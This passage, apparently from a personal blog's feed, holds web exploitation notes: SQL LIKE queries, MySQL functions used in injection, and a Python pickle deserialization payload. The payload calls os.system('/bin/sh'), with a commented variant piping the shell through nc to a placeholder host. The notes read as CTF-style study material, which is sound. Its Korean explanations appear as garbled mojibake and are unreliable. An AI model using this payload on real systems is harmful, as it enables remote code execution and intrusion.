<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'%won%'</span> <span class="c1">-- include won</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'___'</span> <span class="c1">-- length 3 chars</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="nb">binary</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'~'</span> <span class="c1">-- distinguish upper/lower</span>
</code></pre></div></div>

<p><strong>4. Internal function in mysql</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">char(...)</code> : change integer arguments to char (ex. <code class="language-plaintext highlighter-rouge">char(0x61,0x62,0x63)</code>=&gt;<code class="language-plaintext highlighter-rouge">"abc"</code>)</li>
  <li><code class="language-plaintext highlighter-rouge">mid/substr[ing](a,b,c)</code> : get <code class="language-plaintext highlighter-rouge">c</code> bytes in <code class="language-plaintext highlighter-rouge">a</code> from <code class="language-plaintext highlighter-rouge">b(starts from 1 ~ ..)</code></li>
  <li><code class="language-plaintext highlighter-rouge">left(a,b)</code> / <code class="language-plaintext highlighter-rouge">right(a,b)</code> : get <code class="language-plaintext highlighter-rouge">b</code> bytes in <code class="language-plaintext highlighter-rouge">a</code> (begin / end(reverse but print correctly))</li>
  <li><code class="language-plaintext highlighter-rouge">version()</code> : get mysql version</li>
  <li><code class="language-plaintext highlighter-rouge">database()</code> : get current database</li>
</ul>

<p><br /></p>

<h2 id="python-pickle-deserialization">python pickle deserialization</h2>
<p><code class="language-plaintext highlighter-rouge">pickle</code>ë¡œ ì§ë ¬í™”ëœ ê°ì²´ê°€ ë³€ì¡°ë˜ì–´ ì—­ì§ë ¬í™”í•˜ëŠ” ê³¼ì •ì—ì„œ ì‹œìŠ¤í…œì— ì ‘ê·¼í•˜ê±°ë‚˜ ì˜ë„ì¹˜ ì•Šì€ ê²ƒì´ ì‹¤í–‰ë˜ê¸°ë„ í•œë‹¤. ì›í•˜ëŠ” classë¥¼ ì„ ì–¸í•œ ë’¤, <code class="language-plaintext highlighter-rouge">__reduce__</code>ë¥¼ í†µí•˜ì—¬ <code class="language-plaintext highlighter-rouge">pickle.loads</code> í•¨ìˆ˜ì—ì„œ unpickle ì‹œ <code class="language-plaintext highlighter-rouge">tuple</code>ì„ ë°˜í™˜í•˜ì—¬ í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìˆë‹¤.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">pickle</span>

<span class="k">class</span> <span class="nc">payload</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
  <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
    <span class="c1">#return (os.system, ('ls', ))
</span>    <span class="c1">#return (os.system, ('cat flag', ))
</span>    <span class="nf">return </span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">,</span> <span class="p">))</span>
    <span class="c1">#return (os.system, ('/bin/sh | nc [ip] [port]', ))
</span>
<span class="n">pickle_d</span><span class="o">=</span><span class="n">pickle</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="nf">payload</span><span class="p">())</span>
<span class="n">pickle</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">pickle_d</span><span class="p">)</span> <span class="c1"># get shell anyway
</span></code></pre></div></div>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="nb">id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">test</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">test</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">test</span><span class="p">)</span>
</code></pre></div></div>

<p>update ì˜ˆì •.</p>]]></content><author><name>st4rlight (Ainsetin)</name></author><category term="note" /><summary type="html"><![CDATA[web exploitation note by using many ways]]></summary></entry></feed>